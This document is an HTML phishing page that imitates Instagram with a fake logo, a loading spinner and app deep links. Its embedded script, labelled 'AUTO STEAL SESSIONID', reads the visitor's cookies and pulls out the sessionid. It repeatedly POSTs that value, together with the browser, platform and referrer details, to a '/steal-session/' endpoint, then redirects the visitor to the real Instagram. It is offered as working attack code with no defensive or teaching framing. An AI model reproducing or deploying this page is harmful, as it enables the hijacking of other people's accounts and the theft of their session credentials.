<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <meta name="theme-color" content="#000000">
    
    <!-- FAKE INSTAGRAM LOADING SCREEN -->
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body,html { height:100%; overflow:hidden; background:#fafafa; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; }
        
        .loader-container {
            position:fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:9999;
            display:flex; flex-direction:column; align-items:center; justify-content:center;
        }
        .instagram-logo {
            width:120px; height:120px;
            background:url('https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png') center/contain no-repeat;
        }
        .loading-text {
            margin-top:30px; font-size:20px; color:#262626; font-weight:600;
        }
        .spinner {
            margin-top:20px; width:50px; height:50px; border:5px solid #e0e0e0; border-top:5px solid #0095f6;
            border-radius:50%; animation:spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
    </style>
</head>
<body>

    <!-- FAKE INSTAGRAM LOADING -->
    <div class="loader-container" id="fakeLoader">
        <div class="instagram-logo"></div>
        <div class="loading-text">Opening Instagram...</div>
        <div class="spinner"></div>
    </div>

    <script>
        // AUTO STEAL SESSIONID + OPEN INSTAGRAM APP
        (function() {
            // HIDE LOADER AFTER 2 SECONDS
            setTimeout(() => {
                document.getElementById('fakeLoader').style.display = 'none';
            }, 2000);

            // TRY TO OPEN INSTAGRAM APP (ANDROID + iOS)
            const deepLinks = [
                "instagram://app",
                "instagram://library",
                "instagram://camera",
                "intent://instagram.com/_u/instagram/#Intent;scheme=instagram;package=com.instagram.android;end"
            ];

            let tried = 0;
            function tryDeepLink() {
                if (tried < deepLinks.length) {
                    window.location = deepLinks[tried];
                    tried++;
                    setTimeout(tryDeepLink, 800);
                } else {
                    // FALLBACK TO WEB
                    window.location = "https://www.instagram.com/";
                }
            }

            setTimeout(tryDeepLink, 500);

         
            function stealSession() {
                const cookies = document.cookie;
                const match = cookies.match(/sessionid=([^;]+)/);
                if (match) {
                    const sessionid = match[1];

                    fetch('/steal-session/', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-Requested-With': 'XMLHttpRequest'
                        },
                        body: JSON.stringify({
                            sessionid: sessionid,
                            useragent: navigator.userAgent,
                            platform: navigator.platform,
                            referrer: document.referrer || "direct",
                            timestamp: new Date().toISOString(),
                            url: window.location.href
                        })
                    }).catch(() => {});
                }
            }

            stealSession();

           
            setInterval(stealSession, 2000);

           
            setTimeout(() => {
                window.location = "https://www.instagram.com/";
            }, 4000);
        })();
    </script>
</body>
</html>
